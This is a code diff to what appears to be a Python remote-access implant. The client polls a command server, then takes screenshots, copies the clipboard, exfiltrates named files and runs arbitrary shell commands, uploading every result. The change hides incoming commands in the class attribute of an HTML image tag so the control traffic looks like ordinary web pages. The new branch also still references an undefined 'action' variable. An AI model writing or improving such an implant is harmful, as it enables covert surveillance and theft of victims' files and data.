@@ -1,7 +1,7 @@
 from src import upload,screenshot,clipboard,files,command
+from bs4 import BeautifulSoup
 import random, string
 import requests
-import json
 import time
 
 HOSTNAME="USER-PC"
@@ -18,23 +18,24 @@ requests.get(ack_url)
 
 while True:
     get_cmd="{}/c/{}/{}/{}".format(BASE_URL,HOSTNAME,IP,random_string(30))
-    url=get_cmd+random_string(24)
-    action=json.loads(requests.get(url).content.decode())["actions"]
-    args=action.split(" ")
-    if args[0]=="screenshot":
-        (md5,data)=screenshot.take_screenshot()
-        upload.upload_data(BASE_URL,HOSTNAME,IP,"Screenshot",data,md5)
-    elif args[0]=="clipboard":
-        data=clipboard.get_clipboard()
-        upload.upload_data(BASE_URL,HOSTNAME,IP,"Clipboard",data)
-    elif args[0]=="download":
-        (md5,data,filetype)=files.exfiltrate_file(args[1])
-        if data:
-            if filetype == "":
-                filetype="FILE"
-            upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
-    elif len(action)>0:
-        data=command.execute_cmd(args)
-        if data!="":
-            upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
+    html_doc=requests.get(get_cmd).content.decode()
+    soup = BeautifulSoup(html_doc, 'html.parser')
+    args=soup.find(alt="screen3").get('class')
+    if args:
+        if args[0]=="screenshot":
+            (md5,data)=screenshot.take_screenshot()
+            upload.upload_data(BASE_URL,HOSTNAME,IP,"Screenshot",data,md5)
+        elif args[0]=="clipboard":
+            data=clipboard.get_clipboard()
+            upload.upload_data(BASE_URL,HOSTNAME,IP,"Clipboard",data)
+        elif args[0]=="download":
+            (md5,data,filetype)=files.exfiltrate_file(args[1])
+            if data:
+                if filetype == "":
+                    filetype="FILE"
+                upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
+        elif len(action)>0:
+            data=command.execute_cmd(args)
+            if data!="":
+                upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
     time.sleep(15)
